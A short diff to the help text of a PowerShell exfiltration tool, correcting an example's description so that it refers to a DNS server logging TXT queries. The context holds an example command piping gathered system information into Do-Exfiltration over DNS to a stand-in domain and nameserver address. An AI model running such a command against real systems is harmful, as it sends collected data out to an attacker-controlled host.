@@ -49,7 +49,7 @@ Use above command for data exfiltration to a webserver which logs POST requests.
 .EXAMPLE
 PS > Get-Information | Do-Exfiltration -ExfilOption DNS -DomainName example.com -AuthNS 192.168.254.228
 
-Use above command for data exfiltration to a webserver which logs POST requests.
+Use above command for data exfiltration to a DNS server which logs TXT queries.
 
 
 .LINK
